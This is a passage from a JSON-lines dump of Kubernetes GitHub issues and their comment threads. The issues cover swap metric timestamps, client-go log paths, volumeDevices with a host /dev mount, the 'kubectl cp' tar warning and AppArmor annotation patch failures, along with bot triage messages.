2\"\r\nANSI_COLOR=\"0;33\"\r\nCPE_NAME=\"cpe:2.3:o:amazon:amazon_linux:2\"\r\nHOME_URL=\"https://amazonlinux.com/\"\r\n```\r\n\r\n1.15\r\n```\r\n$ ami-0c42d7bd0e31ee2fe amazon-eks-node-1.15-v20200814\r\n$ uname -a\r\nLinux ip-xxxxxx.xxxxxx.compute.internal 4.14.186-146.268.amzn2.x86_64 #1 SMP Tue Jul 14 18:16:52 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux\r\n$ cat /etc/os-release\r\nNAME=\"Amazon Linux\"\r\nVERSION=\"2\"\r\nID=\"amzn\"\r\nID_LIKE=\"centos rhel fedora\"\r\nVERSION_ID=\"2\"\r\nPRETTY_NAME=\"Amazon Linux 2\"\r\nANSI_COLOR=\"0;33\"\r\nCPE_NAME=\"cpe:2.3:o:amazon:amazon_linux:2\"\r\nHOME_URL=\"https://amazonlinux.com/\"\r\n```\r\n- Install tools: AWS Console\r\n- Network plugin and version (if this is a network-related bug): amazon-k8s-cni:v1.6.3-eksbuild.1\r\n"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 134359, "issue_url": "https://github.com/kubernetes/kubernetes/issues/134359", "issue_title": "Node swap metric uses memory timestamp instead of swap timestamp", "issue_author": "ajaysundark", "issue_body": "### What happened?\n\nThe `collectNodeSwapMetrics` function emits node swap usage metrics with the timestamp from node memory stats rather than swap stats. This issue was caught in https://github.com/kubernetes/kubernetes/pull/132945\n\n### What did you expect to happen?\n\nNode swap usage metrics should use the swap stat timestamp to accurately reflect the time of stat collection, matching the handling for pod and container swap metrics.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\n- Review `collectNodeSwapMetrics` in `pkg/kubelet/metrics/collectors/resource_metrics.go`.\n\n### Anything else we need to know?\n\nPod and container swap metrics already use the correct swap stat timestamp.\n\n### Kubernetes version\n\nN/A\n\n### Cloud provider\n\nN/A\n\n### OS version\n\n_No response_\n\n### Install tools\n\n_No response_\n\n### Container runtime (CRI) and version (if applicable)\n\n_No response_\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n_No response_", "issue_labels": ["kind/bug", "sig/node", "triage/accepted"], "comments": [{"author": "ajaysundark", "body": "/assign @ajaysundark "}, {"author": "ajaysundark", "body": "/triage accepted\n/sig node"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 123784, "issue_url": "https://github.com/kubernetes/kubernetes/issues/123784", "issue_title": "client-go: reflector name defaulting seems broken by Go modules", "issue_author": "howardjohn", "issue_body": "### What happened?\n\nClient-go emits logs like\r\n```\r\nListing and watching *v1.Namespace from pkg/mod/k8s.io/client-go@v0.29.2/tools/cache/reflector.go:229\r\n```\r\n\n\n### What did you expect to happen?\n\nLog says \"from <somewhere more useful>\"\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nIncrease verbosity of anything using client-go, check logs\n\n### Anything else we need to know?\n\nCode is from https://github.com/kubernetes/kubernetes/blame/05cb0a55c88e0cdcfe2fb184328ad9be53e94d5c/staging/src/k8s.io/client-go/tools/cache/reflector.go#L290. `client-go/tools/cache/` is no longer accurate, with go modules this will actually be something like `client-go@v0.29.1/tools/cache/` generally. The blame shows its 6 years old which was before go modules, which would make sense.\r\n\r\nThis also means this has probably been an issue for many years, and it only impacts logs that are generally disabled, so this is certainly not a high priority\n\n### Kubernetes version\n\n<details>\r\n\r\n```console\r\nN/A\r\n```\r\n\r\n</details>\r\n\n\n### Cloud provider\n\n<details>\r\n\r\n</details>\r\nN/A\n\n### OS version\n\n<details>\r\n\r\n```console\r\n# On Linux:\r\n$ cat /etc/os-release\r\n# paste output here\r\n$ uname -a\r\n# paste output here\r\n\r\n# On Windows:\r\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\r\n# paste output here\r\n```\r\n\r\n</details>\r\n\n\n### Install tools\n\n<details>\r\n\r\n</details>\r\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\r\n\r\n</details>\r\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\r\n\r\n</details>\r\n", "issue_labels": ["kind/bug", "sig/api-machinery", "lifecycle/rotten", "needs-triage"], "comments": [{"author": "pacoxu", "body": "/sig api-machinery"}, {"author": "seans3", "body": "/triage accepted"}, {"author": "mouuii", "body": "/assign"}, {"author": "mouuii", "body": "is it ok to change the filename to k8s.io/client-go/tools/cache/reflector.go?"}, {"author": "k8s-triage-robot", "body": "This issue has not been updated in over 1 year, and should be re-triaged.\n\nYou can:\n- Confirm that this issue is still relevant with `/triage accepted` (org members only)\n- Close this issue with `/close`\n\nFor more details on the triage process, see https://www.kubernetes.dev/docs/guide/issue-triage/\n\n/remove-triage accepted"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle stale`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle rotten\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n\nThis bot triages issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Reopen this issue with `/reopen`\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/close not-planned\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-ci-robot", "body": "@k8s-triage-robot: Closing this issue, marking it as \"Not Planned\".\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/123784#issuecomment-3394864922):\n\n>The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n>\n>This bot triages issues according to the following rules:\n>- After 90d of inactivity, `lifecycle/stale` is applied\n>- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n>- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n>\n>You can:\n>- Reopen this issue with `/reopen`\n>- Mark this issue as fresh with `/remove-lifecycle rotten`\n>- Offer to help out with [Issue Triage][1]\n>\n>Please send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n>\n>/close not-planned\n>\n>[1]: https://www.kubernetes.dev/docs/guide/issue-triage/\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 131638, "issue_url": "https://github.com/kubernetes/kubernetes/issues/131638", "issue_title": "VolumeDevices mappings ignored when /dev is volumeMounted", "issue_author": "eaceaser", "issue_body": "### What happened?\n\nWhen the host system's `/dev` is mounted into a container, `volumeDevices` do not appear to get created. \n\nEven if `/dev` is mounted into a container, it is necessary to be able to map a volume (e.g. a PVC with `volumeMode: Block`) to a known name, because the actual path of the block device in `/dev` may vary.\n\n### What did you expect to happen?\n\nI expect `volumeDevices` to be mapped no matter what other volumes are mounted into the container.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nCreate a Block PVC:\n\n```\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n  name: test\nspec:\n  accessModes:\n  - ReadWriteOnce\n  resources:\n    requests:\n      storage: 1Gi\n  storageClassName: ebs-gp3\n  volumeMode: Block\n```\n\nThen create a pod that tries to mount it and /dev:\n\n```\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: test\nspec:\n  selector:\n    matchLabels:\n      app: test\n  template:\n    metadata:\n      labels:\n        app: test\n    spec:\n      containers:\n        - image: debian:bookworm\n          name: test\n          command:\n            - sleep\n            - infinity\n          volumeMounts:\n            - mountPath: /dev\n              name: dev\n          volumeDevices:\n            - devicePath: /disks/test\n              name: test\n      volumes:\n        - name: dev\n          hostPath:\n            path: /dev\n            type: Directory\n        - name: test\n          persistentVolumeClaim:\n            claimName: test\n\n```\n\nAnd observe that `/disks/test` is not created. If you remove the `/dev` volumeMount, `/disks/test` is created as expected.\n\n### Anything else we need to know?\n\nSeems somewhat similar to https://github.com/kubernetes/kubernetes/issues/85624 but the container being privileged doesn't matter in this case.\n\n### Kubernetes version\n\n<details>\n\n```console\n\u276f kubectl version\nClient Version: v1.32.4\nKustomize Version: v5.5.0\nServer Version: v1.32.3-eks-bcf3d70\n```\n\n</details>\n\n\n### Cloud provider\n\n<details>\nAWS, using EKS\n</details>\n\n\n### OS version\n\n<details>\n\n```console\nNAME=\"Amazon Linux\"\nVERSION=\"2023\"\nID=\"amzn\"\nID_LIKE=\"fedora\"\nVERSION_ID=\"2023\"\nPLATFORM_ID=\"platform:al2023\"\nPRETTY_NAME=\"Amazon Linux 2023.7.20250414\"\nANSI_COLOR=\"0;33\"\nCPE_NAME=\"cpe:2.3:o:amazon:amazon_linux:2023\"\nHOME_URL=\"https://aws.amazon.com/linux/amazon-linux-2023/\"\nDOCUMENTATION_URL=\"https://docs.aws.amazon.com/linux/\"\nSUPPORT_URL=\"https://aws.amazon.com/premiumsupport/\"\nBUG_REPORT_URL=\"https://github.com/amazonlinux/amazon-linux-2023\"\nVENDOR_NAME=\"AWS\"\nVENDOR_URL=\"https://aws.amazon.com/\"\nSUPPORT_END=\"2029-06-30\"\n\nLinux 6.1.132-147.221.amzn2023.aarch64 #1 SMP Tue Apr  8 13:14:35 UTC 2025 aarch64 aarch64 aarch64 GNU/Linux\n```\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n> ctr version\nClient:\n  Version:  1.7.27\n  Revision: 05044ec0a9a75232cad458027ca83437aae3f4da\n  Go version: go1.23.7\n\nServer:\n  Version:  1.7.27\n  Revision: 05044ec0a9a75232cad458027ca83437aae3f4da\n  UUID: fa952131-14a2-401d-b8f2-4cd0126110ac\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\nhttps://github.com/kubernetes-sigs/aws-ebs-csi-driver - v1.42.0\n</details>\n", "issue_labels": ["kind/bug", "sig/storage", "lifecycle/rotten", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "eaceaser", "body": "/sig storage node"}, {"author": "sreeram-venkitesh", "body": "CC @xing-yang \n"}, {"author": "sreeram-venkitesh", "body": "/remove-sig node"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle stale`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle rotten\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n\nThis bot triages issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Reopen this issue with `/reopen`\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/close not-planned\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-ci-robot", "body": "@k8s-triage-robot: Closing this issue, marking it as \"Not Planned\".\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/131638#issuecomment-3393609322):\n\n>The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n>\n>This bot triages issues according to the following rules:\n>- After 90d of inactivity, `lifecycle/stale` is applied\n>- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n>- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n>\n>You can:\n>- Reopen this issue with `/reopen`\n>- Mark this issue as fresh with `/remove-lifecycle rotten`\n>- Offer to help out with [Issue Triage][1]\n>\n>Please send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n>\n>/close not-planned\n>\n>[1]: https://www.kubernetes.dev/docs/guide/issue-triage/\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 58692, "issue_url": "https://github.com/kubernetes/kubernetes/issues/58692", "issue_title": "Kubectl cp gives \"tar: removing leading '/' from member names\" warning", "issue_author": "stephanwesten", "issue_body": "**Is this a BUG REPORT or FEATURE REQUEST?**:\r\n\r\n> Uncomment only one, leave it on its own line: \r\n>\r\n/kind bug\r\n> /kind feature\r\n\r\n\r\n**What happened**:\r\nIn a shell type the following command:\r\n\r\nkubectl cp [podname]:[source path and filename] [destination path and filename]\r\n\r\nThis gives the following error / warning:\r\ntar: removing leading '/' from member names\r\n\r\n**What you expected to happen**:\r\nI did not expect the tar error / warning. Using the kubectl cp command in scripts/code is now harder because of the unexpected error.\r\n\r\n**How to reproduce it (as minimally and precisely as possible)**:\r\nsee repro path above\r\n\r\n**Anything else we need to know?**:\r\nI'm new, so perhaps the mistake is on my side :-)\r\n\r\n**Environment**:\r\n- Kubernetes version (use `kubectl version`): client 1.7, server 1.8\r\n- Cloud provider or hardware configuration: n/a\r\n- OS (e.g. from /etc/os-release): macos\r\n- Kernel (e.g. `uname -a`): n/a\r\n- Install tools: n/a\r\n- Others:\r\n", "issue_labels": ["kind/bug", "kind/feature", "sig/cli", "lifecycle/rotten"], "comments": [{"author": "stewart-yu", "body": "It's not a bug, may be missing parameter `-C` in tar.\r\n/assign"}, {"author": "k8s-ci-robot", "body": "@stewart-yu: GitHub didn't allow me to assign the following users: stewart-yu.\n\nNote that only [kubernetes members](https://github.com/orgs/kubernetes/people) and repo collaborators can be assigned.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/58692#issuecomment-359993524):\n\n>It's not a bug, may be missing parameter `-C` in tar.\r\n>/assign\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/devel/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "fejta", "body": "@kubernetes/sig-cli-feature-requests "}, {"author": "isaiah1112", "body": "Something I found is that if I do not put a `/` at the beginning of my path following `:` in `<pod>:<path>` that the `kubectl cp` command works fine."}, {"author": "stephanwesten", "body": "I tried your suggestion to drop the leading slash like this:\r\n\r\n`kubectl cp cms-sw-one-6bf986b657-65vbn:home/cms/tomcat/logs ~/documents -c cms --namespace=od'`\r\n\r\nThis gives the following error:\r\n\r\nstderr: tar: home/cms/tomcat/logs: Cannot stat: No such file or directory\r\n\r\nWith the leading / it works fine except for the warning.\r\n\r\n"}, {"author": "kchugalinskiy", "body": "You may try to copy your files to workdir and then retry to copy them using just their names. It's weird, but it works for now."}, {"author": "bityob", "body": "I have the same problem, to solve this, I used the advice @kchugalinskiy gave. \r\n\r\nI moved the wanted file to the working dir in the pod (the directory which is automatically opened, when you open bash on it) - \r\n\r\n```bash\r\nuser@podname:/usr/src# ls data.txt\r\ndata.txt\r\n```\r\n\r\nIn my case it is - `/usr/src` folder. \r\n\r\nThen in my local bash terminal - \r\n\r\n```bash\r\nuser@local:~$ kubectl cp podname:data.txt data.txt\r\nuser@local:~$ ls data.txt\r\ndata.txt\r\n```\r\n\r\n"}, {"author": "MattMS", "body": "I'm receiving the same error message, but also finding the file copied correctly from the container to my local machine.\r\n\r\n- Client: v1.10.1\r\n- Server: v1.9.6-gke.1 (initially tried on v1.9.4-gke.1)\r\n- Platform: GKE\r\n\r\nI'm not sure where to add the tar `-C` flag when using `kubectl cp`.\r\n"}, {"author": "surajssd", "body": "```console\r\n$ ll\r\ntotal 0\r\n\r\n$ kubectl cp web-6fc578559d-sns6p:/usr/share/httpd/noindex/index.html ./new\r\ntar: Removing leading `/' from member names\r\n\r\n$ echo $?\r\n0\r\n\r\n$ cat new | head -10\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.1//EN\" \"http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd\"><html><head>\r\n<meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\">\r\n                <title>Apache HTTP Server Test Page powered by CentOS</title>\r\n                <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\r\n\r\n    <!-- Bootstrap -->\r\n    <link href=\"/noindex/css/bootstrap.min.css\" rel=\"stylesheet\">\r\n    <link rel=\"stylesheet\" href=\"noindex/css/open-sans.css\" type=\"text/css\" />\r\n\r\n<style type=\"text/css\"><!-- \r\n```\r\n\r\nit's not an error some condition since the exit code is `0`. Also the functionality works fine, it's just the error which comes which is kinda confusing.\r\n\r\nAnd this is anwered in multiple places on stackoverflow, https://stackoverflow.com/a/25929424 and https://unix.stackexchange.com/a/59244"}, {"author": "adohe-zz", "body": "I would think this is not a bug, it's just what we expect and should not break any functionality."}, {"author": "AnthonyWC", "body": "It works fine but the message is just confusing."}, {"author": "fejta-bot", "body": "Issues go stale after 90d of inactivity.\nMark the issue as fresh with `/remove-lifecycle stale`.\nStale issues rot after an additional 30d of inactivity and eventually close.\n\nIf this issue is safe to close now please do so with `/close`.\n\nSend feedback to sig-testing, kubernetes/test-infra and/or [fejta](https://github.com/fejta).\n/lifecycle stale"}, {"author": "fejta-bot", "body": "Stale issues rot after 30d of inactivity.\nMark the issue as fresh with `/remove-lifecycle rotten`.\nRotten issues close after an additional 30d of inactivity.\n\nIf this issue is safe to close now please do so with `/close`.\n\nSend feedback to sig-testing, kubernetes/test-infra and/or [fejta](https://github.com/fejta).\n/lifecycle rotten"}, {"author": "fejta-bot", "body": "Rotten issues close after 30d of inactivity.\nReopen the issue with `/reopen`.\nMark the issue as fresh with `/remove-lifecycle rotten`.\n\nSend feedback to sig-testing, kubernetes/test-infra and/or [fejta](https://github.com/fejta).\n/close"}, {"author": "k8s-ci-robot", "body": "@fejta-bot: Closing this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/58692#issuecomment-468141193):\n\n>Rotten issues close after 30d of inactivity.\n>Reopen the issue with `/reopen`.\n>Mark the issue as fresh with `/remove-lifecycle rotten`.\n>\n>Send feedback to sig-testing, kubernetes/test-infra and/or [fejta](https://github.com/fejta).\n>/close\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "tuananh", "body": "i cannot copy the file anywhere else. permission issue.\r\n\r\nis there another workaround?"}, {"author": "surajssd", "body": "@tuananh can you please provide the steps you are performing and what errors do you see? Please elaborate on what you are trying to achieve?"}, {"author": "tuananh", "body": "@surajssd  im trying to get redis dump from container to my machine using this command\r\n\r\n    kubectl cp dev/redisdev-master-0:/bitnami/redis/data/dump.rdb ~/dump.rdb\r\n\r\nI'm getting the above error \r\n\r\n    tar: Removing leading `/' from member names"}, {"author": "surajssd", "body": "@tuananh was the file copied successfully if yes then this is not really an error. If not then there could be other issues. See https://github.com/kubernetes/kubernetes/issues/58692#issuecomment-395957776 for more info"}, {"author": "tuananh", "body": "my bad. the file was copied indeed.\n\n\n\nOn Thu, Apr 4, 2019 at 2:30 PM Suraj Deshmukh <notifications@github.com>\nwrote:\n\n> @tuananh <https://github.com/tuananh> was the file copied successfully if\n> yes then this is not really an error. If not then there could be other\n> issues. See #58692 (comment)\n> <https://github.com/kubernetes/kubernetes/issues/58692#issuecomment-395957776>\n> for more info\n>\n> \u2014\n> You are receiving this because you were mentioned.\n> Reply to this email directly, view it on GitHub\n> <https://github.com/kubernetes/kubernetes/issues/58692#issuecomment-479783189>,\n> or mute the thread\n> <https://github.com/notifications/unsubscribe-auth/AAmSTp5rOGSyz1ZITvuuRI6Dg-zWYvjIks5vdaoGgaJpZM4Rppzx>\n> .\n>\n"}, {"author": "ushell", "body": "The error reason is `kubectl cp` not use right pod file path.\r\n\r\nexample:\r\n\r\nPod WORKDIR set '/var/www/html'\r\n\r\nif you want copy `/var/www/html/foo.log` to your local file folder\r\n\r\nyou will run `kubectl cp POD_NAME:foo.log /Users/foo/foo.log` , it work ok,\r\n\r\nif run `kubectl cp POD_NAME:/var/www/html/foo.log /Users/foo/foo.log` will get warning.\r\n\r\n\r\n\r\n "}, {"author": "wangrqsh", "body": "When i in  c:  run\r\n kubectl cp backend-68c49589fb-7dkkm:/fileStorage/20191231/cd28206c5e654390a815cc03bbc6d14e.png d:/xxx.jpg\r\nerror:\r\n   tar: Removing leading `/' from member names\r\nremove  the / after  pod:   like\r\n\r\nkubectl cp backend-68c49589fb-7dkkm:fileStorage/20191231/cd28206c5e654390a815cc03bbc6d14e.png d:/xxx.jpg\r\nit's ok.\r\n\r\n\r\n\r\n"}, {"author": "fleskesvor", "body": "@wangrqsh The issue has nothing to do with the drives on your local Windows computer. The latter works for you because the `WORKDIR` in your pod is `/`. Try setting a different `WORKDIR` in your pod, and you will also experience the warning."}, {"author": "ghost", "body": "Saw the message trying to copy files out of a Pod. Didn't think to actually check the file system until I saw the suggestion from @AnthonyWC:\r\n\r\n> It works fine but the message is just confusing.\r\n\r\nLooks like the message is just a warning that isn't squelched. Probably."}, {"author": "danielyaa5", "body": "this should probably be reopened"}, {"author": "kaelzhang", "body": "> this should probably be reopened\r\n\r\nYes, this should probably be reopened\r\n\r\n@fejta-bot is evil."}, {"author": "erhhung", "body": "Why this issue should be closed solely because it's not a serious bug or error is baffling. It is obviously a **very real and annoying issue of usability** given how many people have complained about it. Asking people to copy/move the file into the `WORKDIR` first is not a solution\u2014I could just as easily ignore the warning in the first place.\r\n\r\nIf an output message is confusing and **serves no informational purpose** to the user, then it should be suppressed by default\u2014asking the operator to `> /dev/null` is not a solution, either."}, {"author": "danielyaa5", "body": "Preach brother\n\nOn Fri, Apr 2, 2021 at 3:52 PM Erhhung Yuan ***@***.***>\nwrote:\n\n> Why this issue should be closed solely because it's not a serious bug or\n> error is baffling. It is obviously a *very real and annoying issue of\n> usability* given how many people have complained about it. Asking people\n> to copy/move the file into the WORKDIR first is not a solution\u2014I could\n> just as easily ignore the warning in the first place.\n>\n> If an output message is confusing and *serves no informational purpose*\n> to the user, then it should be suppressed by default\u2014asking the operator to >\n> /dev/null is not a solution, either.\n>\n> \u2014\n> You are receiving this because you commented.\n> Reply to this email directly, view it on GitHub\n> <https://github.com/kubernetes/kubernetes/issues/58692#issuecomment-812745674>,\n> or unsubscribe\n> <https://github.com/notifications/unsubscribe-auth/ABSSN2W7WVUY2JIOPYRBLCDTGZDCDANCNFSM4ENGTTYQ>\n> .\n>\n-- \nDaniel Yakobian\nCase Western Reserve University - Comp Sci\n"}, {"author": "joshi95", "body": "Hi ! I want to pick this up. Can suppress the warning which is very concussing for the users."}, {"author": "k8s-ci-robot", "body": "@joshi95: You can't reopen an issue/PR unless you authored it or you are a collaborator.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/58692#issuecomment-837740087):\n\n>/reopen\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 133416, "issue_url": "https://github.com/kubernetes/kubernetes/issues/133416", "issue_title": "Patching doesn't work with pods with annotation based app armor configuration in Kubernets version 1.32", "issue_author": "rickypeng99", "issue_body": "### What happened?\n\nPatching doesn't work with pods with ONLY annotation based app armor configuration in Kubernets version 1.32\n\n### What did you expect to happen?\n\nI expect the patch to go through\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nThis could be an issue before 1.32, but I only tested in 1.32.\n\nIf we have a pod that is still using the annotation based app armor profile (without the `appArmorProfile` field under `securityContext`), for example\n```\n container.apparmor.security.beta.kubernetes.io/container: localhost/<profile-name>\n```\n\nand we run a simple kubectl patch command\n```\nkubectl patch pod test-pod \\\n-p '[{\"op\": \"remove\", \"path\": \"/metadata/labels/label\"}]' \\\n--type=json\n```\n\nThe request will fail with message (only showing the relevant part)\n```\n-\u00a0\t\t\t\tAppArmorProfile: &core.AppArmorProfile{Type: \"Localhost\", LocalhostProfile: &\"<profile-name>\"},\n+\u00a0\t\t\t\tAppArmorProfile: nil,\n\u00a0\u00a0\t\t\t},\n```\nas if my patch is trying to remove the apparmor profile.\n\n### Anything else we need to know?\n\nI have tried patching the pod / deployment to onboard with the new apparmor profile. The edit went through but the resource didn't actually get updated with the appArmorProfile\n\nI have raised another issue for this problem: https://github.com/kubernetes/kubectl/issues/1764\n\n### Kubernetes version\n\n<details>\n\n```console\n$ kubectl version\nClient Version: v1.33.2\nKustomize Version: v5.6.0\nServer Version: v1.32.5-eks-5d4a308\n```\n\n</details>\n\n\n### Cloud provider\n\n<details>\nEKS\n</details>\n\n\n### OS version\n\n<details>\n\n```console\nHardware:\n\n    Hardware Overview:\n\n      Model Name: MacBook Pro\n      Model Identifier: Mac16,7\n      Chip: Apple M4 Pro\n      Total Number of Cores: 14 (10 performance and 4 efficiency)\n      Memory: 48 GB\n      System Firmware Version: 11881.121.1\n      OS Loader Version: 11881.121.1\n```\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "needs-sig", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "There are no sig labels on this issue. Please add an appropriate label by using one of the following commands:\n- `/sig <group-name>`\n- `/wg <group-name>`\n- `/committee <group-name>`\n\nPlease see the [group list](https://git.k8s.io/community/sig-list.md) for a listing of the SIGs, working groups, and committees available.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available 